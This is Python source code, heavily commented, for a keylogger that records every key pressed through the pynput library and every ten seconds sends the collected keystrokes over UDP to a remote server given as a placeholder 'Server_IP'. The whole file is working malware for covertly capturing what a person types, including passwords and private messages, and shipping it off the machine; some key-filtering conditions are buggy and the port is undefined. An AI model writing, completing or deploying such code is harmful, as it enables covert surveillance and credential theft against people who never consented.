# Import the pynput.keyboard module for monitoring and controlling the keyboard
import pynput.keyboard
# Import the threading and socket modules for threading and network communications
import threading, socket

# Initialize a string variable to store the logged keystrokes
logs = ""

# Define a function to save pressed keys into the logs variable
def save_keys(key):
    # Declare logs as a global variable to modify it
    global logs
    # Initialize a temporary string to hold the current key press
    logs_tem = ""
    try: 
        # Attempt to get the character of the key pressed
        logs_tem = str(key.char)
    except AttributeError:
        # If key.char is not available (non-character keys), handle special cases
        if key == key.space:
            # If the space key is pressed, add a space to the logs
            logs = logs + " "
        elif key ==  key.tab or key.alt or key.down or key.enter:
            # If tab, alt, down, or enter keys are pressed, do nothing (pass)
            pass
        elif key == key.up or key.right or key.left or key.backspace:
            # If up, right, left, or backspace keys are pressed, also do nothing
            pass
        elif key == key.shift or key.caps_lock or key.ctrl: 
            # If shift, caps_lock, or ctrl keys are pressed, ignore them as well
            pass
        else:
            # For other keys, log them in a readable format
            logs_tem = " " + str(key) + " "
    # Add the current key's log to the global logs
    logs = logs + logs_tem

# Define a function to send the logs to a server
def send_logs(logs):
    # Create a UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Define a name for the client
    n = 'Client'
    # Format the message to include the client name and the logs
    m = '{}> {}'.format(n, logs)
    # Send the formatted message to the server's IP address and port
    s.sendto(m.encode(), ('Server_IP', port))

# Define a function to report logs periodically
def logs_report():
    # Declare logs as global to clear it after sending
    global logs
    # Send the current logs
    send_logs(logs)
    # Reset the logs string to start logging fresh keystrokes
    logs = ""
    # Set a timer to call logs_report every 10 seconds
    threading_timer = threading.Timer(10, logs_report)
    # Start the timer
    threading_timer.start()

# Create a listener for keyboard events
keys = pynput.keyboard.Listener(on_press=save_keys)
# Context manager to start and manage the keyboard listener
with keys:
    # Call logs_report function to start the logging and reporting process
    logs_report()
    # Join the listener thread to wait for it to complete
    keys.join()
